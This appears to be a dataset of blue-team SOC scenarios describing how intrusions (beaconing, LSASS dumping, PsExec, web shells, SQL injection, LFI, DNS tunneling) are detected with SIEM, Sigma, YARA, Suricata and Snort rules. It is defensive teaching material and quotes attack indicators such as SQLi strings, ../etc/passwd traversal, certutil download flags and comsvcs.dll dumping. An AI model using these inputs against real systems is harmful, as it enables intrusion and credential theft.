# Blue Team Attacks

## Real-Time Beaconing Detection Using SIEM + Regex Rules

- **Attack Type**: SOC Monitoring → Threat Detection
- **Target**: Internal Workstation
- **Vulnerability**: Outbound C2 via HTTP
- **MITRE**: T1071.001
- **Impact**: Detection of ongoing C2 connection
- **Tools**: Splunk, Regex, Wireshark
- **Scenario**: Detecting C2 beaconing via regular interval traffic patterns in logs.
- **Attack Steps**: SOC team notices periodic traffic from an internal workstation every 60 seconds to an external IP. Using Splunk, they correlate the firewall logs to identify repeated connection attempts with the same payload size. A custom regex-based correlation rule is written to flag consistent time-delta patterns (beaconing behavior). Wireshark is then used to manually verify packet structure and destination IP. Threat is triaged as an active C2 channel using HTTP. Blocklists are updated, and endpoint is quarantined.
- **Detection**: Regex-based frequency correlation rules
- **Solution**: Use behavior-based SIEM logic for beaconing
- **Tags**: beacon, siem, splunk, realtime

## Live Threat Hunt for Privilege Escalation Indicators

- **Attack Type**: Threat Hunting → Privilege Escalation
- **Target**: Windows Endpoint
- **Vulnerability**: Weak logging + misused privileges
- **MITRE**: T1134
- **Impact**: Early detection of lateral movement prep
- **Tools**: Velociraptor, Sysmon, Elastic
- **Scenario**: Analyst scans logs for token manipulation and service creation anomalies.
- **Attack Steps**: A security analyst kicks off a threat hunt after receiving an EDR alert of unusual PowerShell usage. They use Velociraptor to sweep endpoints for signs of SeDebugPrivilege, SeImpersonatePrivilege, and newly created services by svchost.exe. Sysmon logs reveal evidence of TokenElevationType=2 on a non-admin user. Cross-correlation shows this user previously executed sc.exe create — not normal behavior. Blue team raises incident and escalates for containment.
- **Detection**: Search for rare service creations by non-admins
- **Solution**: Enable full Sysmon logging + EDR alerting
- **Tags**: hunt, privilege escalation, velociraptor

## MITM Attempt Blocked via ARP Monitoring Script

- **Attack Type**: Live Defense → MITM Prevention
- **Target**: Corporate LAN
- **Vulnerability**: Unmonitored ARP table + no NAC
- **MITRE**: T1040
- **Impact**: ARP spoofing blocked before data leak
- **Tools**: Python Script, ARPwatch, Cisco NAC
- **Scenario**: Custom ARP watcher detects spoofed gateway and triggers isolation.
- **Attack Steps**: A junior SOC analyst notices brief outages from user complaints. A real-time ARP monitoring script shows the gateway MAC address flipping rapidly. Within 60 seconds, the script triggers a NAC rule to block the MAC address of the attacker. Logs are correlated via ARPwatch and switch port mapping. Admin disables the rogue host’s port, blocks its IP at the firewall, and begins forensic analysis. Incident handled within 7 minutes.
- **Detection**: Alert on ARP MAC changes in <60 sec intervals
- **Solution**: Deploy active ARP monitoring + dynamic ACLs
- **Tags**: arp, mitm, real-time response

## Email Account Hijack Detection via Impossible Travel Correlation

- **Attack Type**: SOC Monitoring → Identity Protection
- **Target**: Cloud Identity Platform
- **Vulnerability**: Token replay with geolocation anomalies
- **MITRE**: T1078.004
- **Impact**: Stolen account detected pre-exfiltration
- **Tools**: Azure Sentinel, GeoIP, Microsoft Defender
- **Scenario**: Correlation rule flags account login from India + US within 3 minutes.
- **Attack Steps**: Analyst sets up an "Impossible Travel" detection rule in Azure Sentinel. A user's Office 365 login logs show access from Gujarat, India, followed by another login from Virginia, US, within 180 seconds. GeoIP analysis confirms both events are real. The correlation rule triggers a high-severity alert. Analyst immediately disables the account, invalidates all sessions, and generates an incident for IR team to verify token access logs. The attacker used a stolen refresh token.
- **Detection**: GeoIP + logon time delta + token review
- **Solution**: Enforce device fingerprinting + geo-lock
- **Tags**: azure, o365, impossible travel

## Ransomware Execution Blocked by File Access Pattern Anomaly

- **Attack Type**: Real-Time Response → Malware Containment
- **Target**: Windows Host
- **Vulnerability**: User clicked on phishing attachment
- **MITRE**: T1486
- **Impact**: Prevention of ransomware spread
- **Tools**: CrowdStrike Falcon, Sysinternals
- **Scenario**: EDR flags process encrypting hundreds of files rapidly; auto-kill triggers.
- **Attack Steps**: During normal hours, Falcon EDR detects a local process accessing >300 files in under 30 seconds and attempting to rename them to .locked. A predefined behavioral rule categorizes this as ransomware-like behavior. Falcon immediately kills the parent process and quarantines the host. SOC investigates and confirms the binary was launched by an executable in C:\Temp downloaded from a phishing email. Restoration from backup initiated after isolation.
- **Detection**: File access velocity + rename pattern detection
- **Solution**: Enforce behavioral EDR logic on file rename spikes
- **Tags**: edr, ransomware, real-time containment

## Detecting Credential Dumping via LSASS Memory Access

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Windows Host
- **Vulnerability**: Lack of endpoint process control
- **MITRE**: T1003.001
- **Impact**: Early credential dumping detection
- **Tools**: Splunk, Sysmon, Windows Event Viewer
- **Scenario**: SIEM alert triggers on suspicious memory access to LSASS by non-standard tool.
- **Attack Steps**: SOC analyst configures a Splunk correlation rule to monitor for Event ID 10 (process access) targeting lsass.exe. During routine log review, an alert is generated when a user process (signed as 7z.exe) attempts to access LSASS memory. Investigation reveals this binary is renamed Mimikatz. The process was initiated by a local admin at 2:37 AM, outside work hours. Analyst escalates to IR; machine is isolated, memory image captured for further analysis.
- **Detection**: SIEM correlation on sensitive memory access patterns
- **Solution**: Implement memory access hardening + EDR alerts
- **Tags**: splunk, lsass, mimikatz, event id 10

## Detecting Lateral Movement via PsExec in Windows Event Logs

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Windows Workstations
- **Vulnerability**: Weak service creation monitoring
- **MITRE**: T1021.002
- **Impact**: Early detection of lateral movement
- **Tools**: Splunk, Event Logs, Sysmon
- **Scenario**: Monitoring event patterns from PsExec usage indicating unauthorized lateral movement.
- **Attack Steps**: Analyst notices a burst of Event ID 7045 (Service Control Manager) followed by Event ID 4624 (network logon type 3) in a 5-minute window across multiple endpoints. Using Splunk queries, the SOC maps a pattern of PSEXESVC.exe service creation followed by successful logons using an admin account. These logs originate from a previously compromised finance machine. The incident is escalated as part of a lateral movement attempt using PsExec.
- **Detection**: Correlate Event IDs 7045 + 4624 with service names
- **Solution**: Use Sysmon for detailed service creation tracking
- **Tags**: psexec, windows logs, 4624, 7045

## Detecting SSH Brute Force on Linux via Syslog + Sentinel

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Linux Server
- **Vulnerability**: Weak SSH brute-force protections
- **MITRE**: T1110.001
- **Impact**: Stopping external password attack
- **Tools**: Microsoft Sentinel, Linux Syslog, Fail2Ban
- **Scenario**: Sentinel rule flags repeated SSH login failures from a single IP in <2 min.
- **Attack Steps**: Sentinel integrates with Linux syslogs forwarded from edge servers. A rule is created to monitor for multiple sshd failure logs (authentication failure; logname= uid=0) from the same IP within 90 seconds. When 300+ failed attempts from 192.168.44.129 appear in under 2 minutes, Sentinel auto-escalates the alert. SOC analyst confirms brute-force attempt; the IP is blocked via firewall and the incident is logged for compliance.
- **Detection**: Set threshold on SSH login failure rate
- **Solution**: Use Fail2Ban, geo-blocking, and rate-limiting
- **Tags**: linux, ssh, brute force, sentinel

## Detecting Suspicious PowerShell Execution via Sysmon & Splunk

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Windows Host
- **Vulnerability**: PowerShell misuse + poor parent process visibility
- **MITRE**: T1059.001
- **Impact**: Detects script-based malware staging
- **Tools**: Sysmon, Splunk, PowerShell Logs
- **Scenario**: Analyst investigates PowerShell execution with obfuscated parameters.
- **Attack Steps**: Splunk detects an anomaly via Event ID 4104 (PowerShell Script Block Logging) showing base64-encoded content. Further analysis of Event ID 4688 reveals parent process was winword.exe launching powershell.exe, which is abnormal. Sysmon confirms command-line included -enc and long obfuscated string. Cross-correlating with DNS logs shows beaconing. Analyst flags this as potential C2 or initial malware staging. Machine isolated.
- **Detection**: Monitor encoded PS commands + odd parents (e.g., Office apps)
- **Solution**: Enforce strict script block logging + application whitelisting
- **Tags**: powershell, 4104, obfuscation, splunk

## Detecting Web Shell via Abnormal Apache Logs

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Linux Web Server
- **Vulnerability**: Outdated PHP CMS with file upload vulnerability
- **MITRE**: T1505.003
- **Impact**: Active web shell access in real-time
- **Tools**: ELK Stack, Apache Logs
- **Scenario**: SOC detects PHP web shell behavior by spotting suspicious HTTP POSTs to .php files.
- **Attack Steps**: An alert is configured in Kibana to flag HTTP POSTs to URIs ending in .php with uncommon User-Agent strings. Multiple hits from internal IPs posting to /assets/images/shell.php are detected. Review of Apache logs shows that the same URI returns 200 OK and the POST payloads are command injection strings (whoami, ls -la). SOC team confirms a web shell is active. WAF updated to block IP and URI; server image sent for forensics.
- **Detection**: Monitor anomalous POSTs to .php + odd User-Agent
- **Solution**: Use WAF + upload validation + log analytics
- **Tags**: apache, webshell, kibana, http post

## Detection of DLL Sideloading via Parent-Child Process Chains

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Windows Endpoint
- **Vulnerability**: Weak folder ACLs + DLL search order hijacking
- **MITRE**: T1574.002
- **Impact**: Trusted binary executes attacker DLL silently
- **Tools**: Sysmon, Splunk, Autoruns
- **Scenario**: SIEM identifies unsigned DLLs loaded by signed apps through anomalous path chains.
- **Attack Steps**: Analyst configures Sysmon to log module load events (Event ID 7). A Splunk correlation rule flags cases where DLLs are loaded from non-standard paths (C:\Users\Public\Temp\). Investigation shows onedrive.exe launched svchost.exe, which then loaded util.dll from an attacker-controlled folder. Autoruns confirms the DLL isn’t signed and not registered in official startup locations. DLL sideloading is used to maintain persistence and execute malicious payloads under trusted processes. Endpoint is isolated.
- **Detection**: Track DLL load paths + unsigned binaries via Sysmon
- **Solution**: Enforce signed DLL policy + secure path checks
- **Tags**: dll sideloading, sysmon 7, trusted binary abuse

## Detecting Suspicious Scheduled Task Creation

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Windows Desktop
- **Vulnerability**: Hidden persistence via scheduled tasks
- **MITRE**: T1053.005
- **Impact**: Persistent malware scheduled silently
- **Tools**: Microsoft Sentinel, Windows Logs, Event Tracing
- **Scenario**: SOC flags use of schtasks.exe to launch script with SYSTEM privileges.
- **Attack Steps**: Using Microsoft Sentinel, an analyst sets up detection for Event ID 4698 (Scheduled Task Created). An alert fires when a task named Updater is created with SYSTEM privileges and points to a script in C:\Users\Public\scripts\launch.bat. Further logs show it was created by cmd.exe launched from outlook.exe, indicating phishing as the origin. The task is set to run every 5 minutes and survives reboot. Endpoint is triaged, task deleted, and script analyzed.
- **Detection**: Monitor task creation with SYSTEM + odd parent chain
- **Solution**: Lock down task creation, enable audit logs
- **Tags**: schtasks, outlook abuse, privilege persistence

## Detecting Unauthorized Privilege Assignment via Audit Policy

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Domain Controller
- **Vulnerability**: No RBAC monitoring or approval workflows
- **MITRE**: T1098
- **Impact**: Silent privilege escalation inside domain
- **Tools**: ELK Stack, Winlogbeat, AD Event Logs
- **Scenario**: Elevated privileges assigned to low-privilege account without approval.
- **Attack Steps**: Using Winlogbeat and ELK, SOC builds a dashboard to monitor Windows Security Event ID 4732 (User added to privileged group). A non-privileged user intern01 is suddenly added to Domain Admins by workstation01$. This triggers a critical alert. Cross-referencing shows no change request or ticket, and source system is a compromised kiosk. Immediate response includes privilege revocation, AD password reset, and forensic dump of the kiosk for IR.
- **Detection**: Track 4732 events + correlate with asset ownership
- **Solution**: Use JIT admin roles + group change alerts
- **Tags**: ad privilege abuse, event 4732, elk

## Detecting Reverse Shell Activity via Anomalous Process-Parent Relationships

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Linux Endpoint
- **Vulnerability**: No allow-list for process behavior trees
- **MITRE**: T1059.004
- **Impact**: Detects early-stage reverse shell beaconing
- **Tools**: ELK Stack, Sysmon, Netflow
- **Scenario**: Monitoring for netcat-based or bash reverse shells initiated from non-standard processes.
- **Attack Steps**: The SOC receives an alert from ELK that python3 launched bash, which then initiated a connection to an external IP on port 4444. The event chain is detected by parsing Sysmon Event ID 1 (Process Creation) combined with firewall netflow logs. Normally, only sshd or cron initiate such outbound connections. The alert triggers due to the suspicious parent process (/usr/bin/python3) spawning a shell (/bin/bash). This behavior matches reverse shell patterns. The analyst confirms the IP is unknown and geolocated to another country. The endpoint is isolated and forensics initiated.
- **Detection**: Correlate Sysmon Event ID 1 + netflow egress alerts
- **Solution**: Restrict shell access + build baselines for parent-child chains
- **Tags**: reverse shell, bash, python, sysmon

## Detecting Credential Access via LSASS Dump Attempt with Rundll32

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Windows Enterprise Hosts
- **Vulnerability**: Rundll32 abuse + poor memory access auditing
- **MITRE**: T1003.001
- **Impact**: Blocks stealth credential harvesting
- **Tools**: Splunk, Sysmon, Windows Event Logs
- **Scenario**: Detecting abuse of rundll32.exe used to dump memory from LSASS process.
- **Attack Steps**: A correlation rule in Splunk is configured to detect usage of rundll32.exe accessing lsass.exe (Event ID 10 - Sysmon Process Access). A spike in alerts shows this activity on multiple hosts using the same domain account. Investigating Event ID 4688 (process creation) confirms the command line includes suspicious DLL usage (comsvcs.dll). This behavior mimics known credential dump techniques. Alert escalated for containment and credential reset. Attack is traced to an attacker reusing a legacy admin account across endpoints.
- **Detection**: Alert on rundll32 targeting protected processes
- **Solution**: Disable rundll32 via applocker + memory access restrictions
- **Tags**: lsass dump, rundll32, credential access

## Detecting Web Server Enumeration via Linux Syslogs and SIEM

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Linux Web Server
- **Vulnerability**: Unrestricted HTTP probes + missing WAF
- **MITRE**: T1595.002
- **Impact**: Prevents pre-exploit reconnaissance
- **Tools**: ELK, Fail2Ban, Apache Logs
- **Scenario**: Alerts trigger on excessive 404s and suspicious user agents in Apache logs.
- **Attack Steps**: A SOC analyst receives alerts on repetitive HTTP GET requests from a single IP over 30 minutes. The ELK rule is set to flag 100+ 404 responses with inconsistent URIs. User-Agent strings include tools like DirBuster and curl. The SIEM correlates failed requests, timestamps, and payload patterns, identifying an automated enumeration attempt. Analysts trace the IP back to a Tor exit node. Server firewall is updated, traffic is blocked, and the activity logged for long-term threat intelligence correlation.
- **Detection**: Threshold alert on failed URL hits + scan indicators
- **Solution**: WAF config + deny-list scanning user agents
- **Tags**: dirbuster, recon, apache, 404 scan

## Detecting Living-off-the-Land Attack via WMIC Execution

- **Attack Type**: Log Analysis → SIEM Monitoring
- **Target**: Windows Host
- **Vulnerability**: No alerting on legacy binaries
- **MITRE**: T1047
- **Impact**: Detects stealthy execution via native binaries
- **Tools**: Sentinel, Windows Event Logs, Sysmon
- **Scenario**: Alert triggers when wmic is used to launch encoded commands or reach external IPs.
- **Attack Steps**: Microsoft Sentinel detects wmic process call create used to launch powershell.exe with base64-encoded payload. This behavior deviates from typical wmic usage which usually queries system state. Sentinel correlates Event ID 4688 (Process Creation) and Event ID 1 from Sysmon. The alert includes details of the encoded string, execution timestamp, and destination IP. Cross-analysis shows this was executed by a normal user account via remote WMI from a different subnet. Escalation confirms use of LOLBins to bypass AV. The machine is quarantined and triaged.
- **Detection**: Alert on suspicious LOLBin command usage
- **Solution**: Disable unused LOLBins via GPO + alert on encoded args
- **Tags**: wmic, lolbins, encoded command, sentinel

## Detecting Registry Persistence via SilentCommand Key

- **Attack Type**: Log Analysis → SIEM + EDR Monitoring
- **Target**: Windows Endpoint
- **Vulnerability**: Lack of registry change auditing
- **MITRE**: T1547.001
- **Impact**: Prevents silent malware autostart
- **Tools**: Splunk, CrowdStrike, Autoruns
- **Scenario**: Monitoring registry keys for malicious autorun behavior on boot.
- **Attack Steps**: An alert in CrowdStrike triggers when the registry key HKCU\Software\Microsoft\Command Processor\AutoRun is modified with a PowerShell payload. Splunk receives correlated Event ID 4657 (Registry value modified). Analyst investigates and finds a hidden script using Invoke-WebRequest to pull code from Pastebin. This method ensures persistence across reboots and evades traditional startup folders. Autoruns validates the key as unauthorized. Endpoint is quarantined and registry cleaned.
- **Detection**: Monitor specific autorun registry keys
- **Solution**: Harden registry + deploy registry monitoring tools
- **Tags**: autorun, registry, powershell payload

## Detection of Remote Desktop Credential Theft via Event Log Correlation

- **Attack Type**: Log Analysis → SIEM + EDR Monitoring
- **Target**: Domain-joined Workstation
- **Vulnerability**: Misuse of RDP and stolen accounts
- **MITRE**: T1003.001
- **Impact**: Detects RDP-originated credential access
- **Tools**: Microsoft Sentinel, Sysmon, EDR
- **Scenario**: Alerts on successful RDP session followed by LSASS access by unusual user.
- **Attack Steps**: Sentinel flags a suspicious RDP logon sequence: a successful Event ID 4624 with Logon Type 10 followed by Sysmon Event ID 10 where user2 accesses lsass.exe. Normally, only SYSTEM processes interact with LSASS post-RDP. EDR confirms Mimikatz-like memory read behavior. The attacker used valid credentials and a post-exploitation tool to dump credentials. The machine is segmented, IR initiated, and lateral movement assessed.
- **Detection**: Correlate RDP logon with memory access in short timeframe
- **Solution**: Use session recording and LSASS access control
- **Tags**: rdp, lsass, credential dump, 4624

## Detecting Abuse of CertUtil for File Download

- **Attack Type**: Log Analysis → SIEM + EDR Monitoring
- **Target**: Windows Host
- **Vulnerability**: LOLBIN misuse + open internet access
- **MITRE**: T1105
- **Impact**: Blocks common file delivery vector
- **Tools**: Sysmon, ELK, EDR
- **Scenario**: certutil.exe used as a Living-off-the-Land Binary (LOLBIN) to pull down payloads.
- **Attack Steps**: SOC receives alert when certutil.exe is run with the -urlcache and -split flags. Sysmon Event ID 1 logs the command line, and ELK correlation reveals it downloaded update.bin from a public GitHub page. EDR detects the file being saved to %TEMP% and executed with rundll32. This technique bypassed traditional download filters. SOC disables user account, hashes are blocked at EDR, and the IP domain is blacklisted.
- **Detection**: Alert on certutil with suspicious arguments
- **Solution**: Block LOLBIN execution via AppLocker + proxy filtering
- **Tags**: certutil, lolbin, file delivery

## Detecting Hidden PowerShell via Event ID + EDR Correlation

- **Attack Type**: Log Analysis → SIEM + EDR Monitoring
- **Target**: Windows Desktop
- **Vulnerability**: Weak parent-child enforcement + script hiding
- **MITRE**: T1059.001
- **Impact**: Identifies obfuscated scripting in real time
- **Tools**: Sentinel, Sysmon, Defender ATP
- **Scenario**: PowerShell launched in hidden window with encoded script; detected via logging.
- **Attack Steps**: Event ID 4104 logs obfuscated PowerShell using -windowstyle hidden -enc. Sysmon confirms Event ID 1 where explorer.exe launched powershell.exe — uncommon behavior. EDR detects process hollowing attempt within 15 seconds of launch. Analysts extract command and decode base64, revealing a script pulling shellcode from an IP over HTTP. SOC initiates kill chain interruption, disables user, and pulls full memory dump.
- **Detection**: Correlate script block logs with hidden execution flags
- **Solution**: Mandate block on encoded PowerShell + enforce EDR response
- **Tags**: powershell, encoded, script block, hidden

## Detection of User Impersonation via Token Theft Indicators

- **Attack Type**: Log Analysis → SIEM + EDR Monitoring
- **Target**: Windows Enterprise
- **Vulnerability**: Token privilege inheritance via open handles
- **MITRE**: T1134.001
- **Impact**: Stops silent privilege abuse
- **Tools**: Splunk, Sysmon, CrowdStrike
- **Scenario**: Malicious use of NT AUTHORITY\SYSTEM impersonation by regular user.
- **Attack Steps**: SIEM triggers an anomaly when user intern21 spawns cmd.exe as NT AUTHORITY\SYSTEM using token.exe — a custom tool. Sysmon logs Event ID 1 with an unusual parent chain (explorer → token.exe → cmd). EDR detects privilege level escalation without password prompts. Memory forensics confirm token impersonation through duplicate handles. Response team blocks the binary hash, disables the user, and resets compromised credentials.
- **Detection**: Detect token impersonation tools + non-standard chains
- **Solution**: Remove duplicate token tools, audit privilege usage
- **Tags**: token theft, impersonation, sid, system

## SQL Injection Detected via Apache Logs and ELK

- **Attack Type**: Web Server Log Monitoring → SQL Injection
- **Target**: Apache Web Server
- **Vulnerability**: Improper input sanitization
- **MITRE**: T1190
- **Impact**: SQLi probe detection in logs
- **Tools**: Apache, ELK Stack, Kibana
- **Scenario**: ELK rule flags suspicious GET request containing SQL keywords in Apache logs.
- **Attack Steps**: 1. An automated job in ELK continuously parses Apache access logs for common SQL injection payloads such as ' OR '1'='1, UNION SELECT, and --. 2. An alert is generated when a GET request to /product.php?id=' OR 1=1-- is logged from IP 91.123.88.22, accompanied by a suspicious User-Agent sqlmap/1.3. 3. The SOC analyst examines the full request chain, confirming repeated probing on different parameters (id=, cat=, ref=). 4. The attacker rotates payloads with variations like ORDER BY 1-- and admin'-- over 15 minutes. 5. The analyst queries for the IP across all virtual hosts and detects activity targeting login forms and search pages as well. 6. After confirming malicious intent, the analyst creates a WAF rule to block similar payloads and blacklists the IP at the network level.
- **Detection**: Regex-based URI pattern + known User-Agent alerts
- **Solution**: Harden input validation + WAF rule tuning
- **Tags**: apache, sql injection, elk, kibana

## LFI Attempt Detected via Apache Logs (../../etc/passwd)

- **Attack Type**: Web Server Log Monitoring → Local File Inclusion
- **Target**: Apache Server
- **Vulnerability**: LFI via insecure include statements
- **MITRE**: T1190
- **Impact**: Detects LFI probing for system files
- **Tools**: Apache, Splunk, Fail2Ban
- **Scenario**: Apache logs show suspicious request using directory traversal in URI.
- **Attack Steps**: 1. Splunk is configured to alert on any request URI that includes patterns like ../, etc/passwd, system32, or boot.ini. 2. A GET request to /index.php?page=../../../../etc/passwd is logged from attacker IP 103.77.93.14, which returns a 403 Forbidden response. 3. Within 10 seconds, the same IP tries alternative variations: URL-encoded (..%2F..%2Fetc/passwd) and double-encoded traversal patterns. 4. The analyst reviews the logs and confirms the repeated use of predictable LFI probes with small time gaps. 5. Fail2Ban has been configured to block any IP with 5 matching traversal attempts within a 3-minute period — the IP is auto-banned. 6. SOC correlates this activity with a potential botnet IP range previously reported in abuse databases. The rule is expanded to block all known variations and a honeypot endpoint is created to track future hits.
- **Detection**: Track 403s with directory traversal patterns
- **Solution**: Use static whitelisting for file includes
- **Tags**: lfi, apache, etc/passwd, traversal

## Directory Enumeration via .git/ Access in Apache Logs

- **Attack Type**: Web Server Log Monitoring → Reconnaissance
- **Target**: Apache Web Server
- **Vulnerability**: Leftover .git folders accessible via HTTP
- **MITRE**: T1087.003
- **Impact**: Prevents credential leakage via .git
- **Tools**: Apache, ELK, OSSEC
- **Scenario**: Apache logs show user probing for .git/config file directly.
- **Attack Steps**: 1. ELK is configured to monitor for any access attempts to sensitive directories such as .git/, .svn/, .env, or composer.lock. 2. Logs show multiple GET requests from IP 142.250.99.2 for URIs like /admin/.git/config, /site/.git/logs/HEAD, and /assets/.git/index. 3. The User-Agent mimics a browser (Mozilla/5.0), but access times show identical 4-second intervals indicating automation. 4. OSSEC flags the behavior as abnormal and escalates an event to the SOC dashboard. 5. Upon manual investigation, the analyst verifies that .git folders were mistakenly deployed in a public subdirectory due to a misconfigured CI/CD pipeline. 6. Access to .git/ is restricted by updating the Apache .htaccess file, the IP is banned, and a cleanup task is pushed to the dev team to sanitize deployment artifacts.
- **Detection**: Detect URI patterns with .git/
- **Solution**: Block VCS folders via web server rules
- **Tags**: git, apache, recon, misconfig

## Detecting Suspicious Parent-Child Process Chains (e.g., Word > PowerShell)

- **Attack Type**: Detection Engineering → Process Tree Anomaly Rules
- **Target**: Enterprise Workstation
- **Vulnerability**: Office macro execution + LOLBin use
- **MITRE**: T1059.001
- **Impact**: Stops weaponized documents launching payloads
- **Tools**: Sigma, Sysmon, Splunk
- **Scenario**: Designing a rule to detect Office document spawning shell commands — common in phishing.
- **Attack Steps**: 1. Detection engineer writes a Sigma rule targeting Sysmon Event ID 1 where the parent process is WINWORD.EXE and child process is powershell.exe. 2. Rule filters for common command-line flags like -enc, -nop, -w hidden. 3. Engineer tests this logic using atomic red team framework to simulate real phishing payloads. 4. SIEM alerts successfully trigger when the simulated Word document launches PowerShell. 5. Rule is validated in test and deployed to production with metadata (TTP mapping, alert name, false positive context). 6. Documentation includes examples of benign apps that may trigger (e.g., Outlook plugins).
- **Detection**: Match parent-child process with encoded flags
- **Solution**: Disable Office macros + restrict shell access
- **Tags**: sigma, word2ps, process anomaly, red team sim

## Detecting DNS Tunneling via Unusually Long Query Strings

- **Attack Type**: Detection Engineering → Network Anomaly Logic
- **Target**: Internal Network
- **Vulnerability**: DNS abused for covert data channel
- **MITRE**: T1071.004
- **Impact**: Detects covert data exfil
- **Tools**: Zeek, Sigma, Suricata
- **Scenario**: Rule crafted to catch long or high-frequency DNS queries indicative of tunneling.
- **Attack Steps**: 1. Engineer analyzes DNS logs using Zeek to identify queries with lengths > 100 characters and > 20 queries/min from a single source. 2. Using Sigma/YAML format, rule looks for .xyz, .tk, or .top domains often used in exfil tunnels. 3. SOC simulates a dnscat2 session and validates detection triggers. 4. The DNS logs show repeated base64-encoded subdomain strings like YWJjZGVmLmNvbQ==.exfil.com. 5. Rule is pushed to Suricata for inline alerting and to the SIEM dashboard for visibility. 6. Response plan includes isolating machine, decoding payload, and enriching via threat intel.
- **Detection**: Regex + frequency on DNS queries
- **Solution**: Restrict external DNS + deep packet inspection
- **Tags**: dns tunneling, zeek, long query

## YARA Rule to Detect Obfuscated PowerShell Scripts in Memory

- **Attack Type**: Detection Engineering → Memory Signature Rule
- **Target**: Memory
- **Vulnerability**: In-memory payloads with obfuscated PowerShell
- **MITRE**: T1059.001
- **Impact**: Detects evasive, fileless malware
- **Tools**: YARA, Velociraptor, Memory Dump
- **Scenario**: Engineer creates YARA rule to catch PowerShell scripts obfuscated in memory (e.g., GZip+Base64).
- **Attack Steps**: 1. Detection engineer observes a malware campaign using base64-encoded PowerShell payloads stored in memory. 2. Using test malware, engineer dumps memory using Velociraptor and identifies consistent byte patterns (e.g., TVqQA... + Invoke-Expression). 3. YARA rule is authored with multiple conditions: memory context, base64 markers, known commands. 4. Rule is deployed to EDR-integrated scanners for live memory scans. 5. Tests with benign tools ensure low false positives. 6. Rule triggers on live host running Emotet variant — confirms effectiveness in production.
- **Detection**: In-memory YARA scan with layered conditionals
- **Solution**: Periodic memory inspection + inline EDR scan
- **Tags**: yara, memory, fileless, powershell

## Detecting AWS Credential Abuse via KQL Rule in Sentinel

- **Attack Type**: Detection Engineering → Cloud Detection Rule
- **Target**: Cloud Infra (AWS)
- **Vulnerability**: Leaked credentials reused
- **MITRE**: T1078
- **Impact**: Detects early signs of cloud compromise
- **Tools**: Azure Sentinel, KQL
- **Scenario**: Rule to detect abnormal access to AWS API with compromised keys.
- **Attack Steps**: 1. Engineer writes KQL rule to monitor AWS CloudTrail logs ingested into Sentinel. 2. The logic identifies rare activities such as ListBuckets from non-org IPs, or CreateUser during non-business hours. 3. Simulation: credentials are leaked in GitHub, attacker uses them from foreign IP to list and delete S3 buckets. 4. Rule triggers on geolocation + API key usage anomaly. 5. Alert provides IAM user, source IP, timestamp, and full CloudTrail context. 6. Rule is tuned to reduce noise from known automation accounts. Response includes IAM key deactivation and security bulletin.
- **Detection**: KQL on API abuse patterns + geo
- **Solution**: Rotate keys regularly + IP allowlists
- **Tags**: sentinel, cloudtrail, aws compromise

## Suricata Rule to Detect Base64 Payload in HTTP POST

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Internal Workstations
- **Vulnerability**: Data exfiltration through base64 encoding
- **MITRE**: T1041
- **Impact**: Identifies covert C2 and data exfiltration
- **Tools**: Suricata, ELK, Wireshark
- **Scenario**: Detects suspicious base64 payloads being exfiltrated via HTTP POST requests.
- **Attack Steps**: 1. The security team observes periodic HTTP POST requests with large, unintelligible payloads coming from a workstation to an unknown domain. 2. The team inspects the payloads and recognizes base64-encoded patterns like dXNlcm5hbWU9am9obiZ.... 3. A custom Suricata rule is created to detect HTTP POST requests where Content-Type is application/x-www-form-urlencoded and the body includes continuous base64-like strings over 100 characters. 4. The rule uses a PCRE regex pattern to scan for [A-Za-z0-9+/=]{100,} in POST bodies. 5. The team simulates a Sliver beacon and confirms the Suricata alert triggers correctly. 6. Upon validation, the rule is added to production with alert forwarding to ELK and Slack. 7. The attacker’s domain is blocked, and EDR agents on affected hosts are triggered to begin memory capture.
- **Detection**: Suricata deep packet inspection + regex on POST body
- **Solution**: HTTP POST inspection + DNS/IP block + EDR isolation
- **Tags**: base64, POST, C2, Suricata

## Snort Rule for SQL Injection via URL Parameters

- **Attack Type**: Detection Engineering → Snort Rule
- **Target**: Web Applications
- **Vulnerability**: Input sanitization failures
- **MITRE**: T1190
- **Impact**: Detects attempts to exploit vulnerable queries
- **Tools**: Snort, Burp Suite, Security Onion
- **Scenario**: Catch SQL injection attacks using typical payloads in HTTP requests.
- **Attack Steps**: 1. SOC notices increased alerts on the /login.php endpoint and reviews logs to find requests like /login.php?user=admin'--. 2. A custom Snort rule is created to inspect the GET/POST URI for SQLi indicators such as ' OR 1=1, UNION SELECT, and --. 3. Regex logic is added to the Snort rule using uricontent and pcre to reduce false positives. 4. The team tests with sqlmap and Burp Suite attacks in a sandbox. 5. Valid alerts are triggered on malicious queries, while benign parameterized queries pass unflagged. 6. Alerts now correlate with IDS log fields such as IP, full request URI, and User-Agent. 7. A correlation rule is created to escalate if more than 3 attempts are detected from the same IP within 5 minutes.
- **Detection**: Snort URI pattern detection + rate limiting
- **Solution**: Input sanitization + WAF + rule-based detection
- **Tags**: SQLi, Snort, GET/POST, url patterns

## Suricata Rule for DNS Tunneling Detection

- **Attack Type**: Detection Engineering → Suricata Rule
- **Target**: Workstations
- **Vulnerability**: DNS abused as covert channel
- **MITRE**: T1071.004
- **Impact**: Detects exfiltration via DNS
- **Tools**: Suricata, Zeek, ELK
- **Scenario**: Flags DNS queries with unusually long, frequent, and encoded-looking subdomains.
- **Attack Steps**: 1. SOC analysts investigate abnormal DNS request volumes from a developer workstation to unknown .tk and .xyz domains. 2. Using Zeek, they find subdomains are overly long and encoded (e.g., dG9rZW49YWRtaW4=.xyz). 3. A Suricata rule is created to detect UDP port 53 packets with query lengths exceeding 80 characters and domains containing multiple dots. 4. Base64-like patterns are identified in the query section using PCRE within the rule. 5. Analysts test with dnscat2 and iodine and the alerts fire correctly, catching both standard and encoded formats. 6. The alert provides query length, domain, source IP, and frequency metrics. 7. The SOC implements egress DNS monitoring, and the workstation is forensically analyzed.
- **Detection**: Pattern + frequency match on subdomains
